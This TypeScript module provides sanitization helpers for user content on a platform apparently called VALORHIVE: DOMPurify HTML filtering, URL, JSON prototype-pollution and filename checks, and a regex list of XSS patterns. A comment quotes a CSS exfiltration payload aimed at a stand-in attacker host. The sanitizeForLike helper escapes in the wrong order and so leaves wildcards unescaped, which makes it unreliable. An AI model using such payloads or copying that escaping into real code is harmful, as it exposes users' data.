/**
 * VALORHIVE Content Sanitization Utilities
 * 
 * Provides DOMPurify-based sanitization for user-generated content.
 * Prevents XSS attacks while allowing safe HTML formatting.
 * 
 * Features:
 * - HTML sanitization for rich text content
 * - Plain text sanitization
 * - URL sanitization
 * - Input validation helpers
 * 
 * @module sanitize
 */

import DOMPurify, { type Config as DOMPurifyConfig } from 'dompurify';

// ============================================
// Configuration
// ============================================

/**
 * Allowed HTML tags for user-generated content
 * Restricted set for security while allowing basic formatting
 */
const ALLOWED_TAGS = [
  'p', 'br', 'strong', 'em', 'u', 's',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
  'ul', 'ol', 'li',
  'blockquote', 'pre', 'code',
  'a', 'span',
  'table', 'thead', 'tbody', 'tr', 'th', 'td',
];

/**
 * Allowed HTML attributes
 * Only safe attributes are permitted
 */
const ALLOWED_ATTR = [
  'href', 'title', 'target', 'rel',
  'class', 'id',
  'colspan', 'rowspan',
];

/**
 * Allowed URI schemes for href attributes
 */
const ALLOWED_URI_REGEXP = /^(?:(?:(?:f|ht)tps?|mailto|tel):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i;

// ============================================
// Core Sanitization Functions
// ============================================

/**
 * Sanitize HTML content for safe rendering
 * 
 * @param dirty - The unsanitized HTML string
 * @param options - Optional DOMPurify configuration
 * @returns Sanitized HTML string
 */
export function sanitizeHtml(
  dirty: string | null | undefined,
  options?: DOMPurifyConfig
): string {
  if (!dirty) return '';
  
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    ALLOWED_URI_REGEXP,
    FORCE_BODY: true,
    ...options,
  });
}

/**
 * Sanitize HTML for more permissive use cases (e.g., tournament descriptions)
 * Allows more formatting options but still removes dangerous content
 * 
 * FIX: Removed 'style' from allowed attributes to prevent CSS-based attacks
 * like data exfiltration via background-image: url(attacker.com/steal?data=...)
 */
export function sanitizeHtmlRich(
  dirty: string | null | undefined
): string {
  if (!dirty) return '';
  
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: [
      ...ALLOWED_TAGS,
      'img', 'video', 'audio', 'source',
      'hr', 'div',
      'sub', 'sup',
      'del', 'ins',
    ],
    ALLOWED_ATTR: [
      ...ALLOWED_ATTR,
      'src', 'alt', 'width', 'height',
      'controls', 'autoplay', 'loop', 'muted',
      // FIX: Removed 'style' - enables CSS-based attacks
    ],
    ALLOWED_URI_REGEXP,
    FORCE_BODY: true,
    // Allow data URIs for images (profile pictures, etc.)
    ADD_DATA_URI_TAGS: ['img', 'video', 'audio', 'source'],
  });
}

/**
 * Strip all HTML tags and return plain text
 * 
 * @param html - HTML string to strip
 * @returns Plain text with all HTML removed
 */
export function stripHtml(html: string | null | undefined): string {
  if (!html) return '';
  
  // First sanitize, then strip
  const sanitized = DOMPurify.sanitize(html, { ALLOWED_TAGS: [] });
  return sanitized;
}

/**
 * Sanitize plain text input
 * Escapes HTML special characters
 * 
 * @param text - Text to sanitize
 * @returns Sanitized text with HTML entities escaped
 */
export function sanitizeText(text: string | null | undefined): string {
  if (!text) return '';
  
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
    '`': '&#x60;',
    '=': '&#x3D;',
  };
  
  return text.replace(/[&<>"'`=/]/g, (char) => map[char] || char);
}

/**
 * Sanitize a URL
 * Only allows safe protocols (http, https, mailto, tel)
 * 
 * @param url - URL to sanitize
 * @returns Sanitized URL or empty string if invalid
 */
export function sanitizeUrl(url: string | null | undefined): string {
  if (!url) return '';
  
  try {
    const parsed = new URL(url);
    
    // Only allow safe protocols
    const safeProtocols = ['http:', 'https:', 'mailto:', 'tel:'];
    if (!safeProtocols.includes(parsed.protocol)) {
      return '';
    }
    
    return parsed.toString();
  } catch {
    // If it's a relative URL, it's safe
    if (url.startsWith('/') || url.startsWith('#')) {
      return url;
    }
    
    // Otherwise, reject
    return '';
  }
}

/**
 * Sanitize user input for use in HTML attributes
 * Prevents attribute injection attacks
 * 
 * @param value - Attribute value to sanitize
 * @returns Sanitized attribute value
 */
export function sanitizeAttribute(value: string | null | undefined): string {
  if (!value) return '';
  
  // Remove any characters that could break out of the attribute
  return value
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/\r?\n/g, ' ')
    .replace(/\r/g, ' ');
}

/**
 * Sanitize JSON string to prevent prototype pollution
 * 
 * FIX: Use recursive check to detect nested prototype pollution attempts
 * Previously only checked top level, allowing {a: {__proto__: {...}}}
 * 
 * @param jsonString - JSON string to parse
 * @returns Parsed and sanitized object or null
 */
export function safeJsonParse<T = unknown>(jsonString: string | null | undefined): T | null {
  if (!jsonString) return null;
  
  try {
    const parsed = JSON.parse(jsonString);
    
    // FIX: Use recursive check for prototype pollution
    if (hasPrototypePollution(parsed)) {
      console.warn('[Security] Blocked potential prototype pollution');
      return null;
    }
    
    return parsed as T;
  } catch {
    return null;
  }
}

/**
 * Recursively check for prototype pollution patterns
 * Checks for __proto__, constructor, and prototype at all levels
 */
function hasPrototypePollution(obj: unknown, seen = new WeakSet()): boolean {
  if (typeof obj !== 'object' || obj === null) {
    return false;
  }
  
  // Prevent infinite loops on circular references
  if (seen.has(obj)) {
    return false;
  }
  seen.add(obj);
  
  // Check for dangerous keys
  const dangerousKeys = ['__proto__', 'constructor', 'prototype'];
  
  if (Array.isArray(obj)) {
    // Check array elements recursively
    for (const item of obj) {
      if (hasPrototypePollution(item, seen)) {
        return true;
      }
    }
  } else {
    // Check object keys and values
    for (const key of Object.keys(obj)) {
      if (dangerousKeys.includes(key)) {
        return true;
      }
      // Recursively check nested objects
      if (hasPrototypePollution((obj as Record<string, unknown>)[key], seen)) {
        return true;
      }
    }
  }
  
  return false;
}

// ============================================
// Input Validation Helpers
// ============================================

/**
 * Validate and sanitize email input
 */
export function sanitizeEmail(email: string | null | undefined): string {
  if (!email) return '';
  
  // Basic email regex
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const sanitized = email.toLowerCase().trim();
  
  if (!emailRegex.test(sanitized)) {
    return '';
  }
  
  return sanitized;
}

/**
 * Validate and sanitize phone number (Indian format)
 */
export function sanitizePhone(phone: string | null | undefined): string {
  if (!phone) return '';
  
  // Remove all non-digits
  const digits = phone.replace(/\D/g, '');
  
  // Indian phone: 10 digits, optionally prefixed with 91
  if (digits.length === 10) {
    return digits;
  }
  if (digits.length === 12 && digits.startsWith('91')) {
    return digits.slice(2);
  }
  
  return '';
}

/**
 * Sanitize filename for safe storage
 */
export function sanitizeFilename(filename: string | null | undefined): string {
  if (!filename) return '';
  
  return filename
    // Remove path traversal attempts
    .replace(/\.\./g, '')
    .replace(/[\/\\]/g, '')
    // Remove null bytes
    .replace(/\0/g, '')
    // Remove control characters
    .replace(/[\x00-\x1f\x80-\x9f]/g, '')
    // Keep only alphanumeric, dash, underscore, dot
    .replace(/[^a-zA-Z0-9._-]/g, '_')
    // Limit length
    .slice(0, 255);
}

/**
 * Sanitize string for use in SQL LIKE query
 * Escapes special LIKE characters
 */
export function sanitizeForLike(value: string | null | undefined): string {
  if (!value) return '';
  
  return value
    .replace(/%/g, '\\%')
    .replace(/_/g, '\\_')
    .replace(/\\/g, '\\\\');
}

// ============================================
// Content Moderation Helpers
// ============================================

/**
 * Check if content contains potentially dangerous patterns
 * Returns true if content appears safe
 */
export function isContentSafe(content: string | null | undefined): boolean {
  if (!content) return true;
  
  const dangerousPatterns = [
    /<script\b/i,
    /javascript:/i,
    /on\w+\s*=/i,  // Event handlers
    /data:/i,
    /vbscript:/i,
    /expression\s*\(/i,
    /@import/i,
    /behavior:/i,
    /-moz-binding:/i,
  ];
  
  return !dangerousPatterns.some((pattern) => pattern.test(content));
}

/**
 * Truncate content to a maximum length while preserving word boundaries
 */
export function truncateContent(
  content: string | null | undefined,
  maxLength: number = 500
): string {
  if (!content) return '';
  
  if (content.length <= maxLength) {
    return content;
  }
  
  // Find the last space before the max length
  const lastSpace = content.lastIndexOf(' ', maxLength);
  
  if (lastSpace > maxLength * 0.8) {
    return content.slice(0, lastSpace) + '...';
  }
  
  return content.slice(0, maxLength - 3) + '...';
}

// ============================================
// Export Object
// ============================================

export const sanitize = {
  html: sanitizeHtml,
  htmlRich: sanitizeHtmlRich,
  stripHtml,
  text: sanitizeText,
  url: sanitizeUrl,
  attribute: sanitizeAttribute,
  json: safeJsonParse,
  email: sanitizeEmail,
  phone: sanitizePhone,
  filename: sanitizeFilename,
  forLike: sanitizeForLike,
  isContentSafe,
  truncate: truncateContent,
};

export default sanitize;
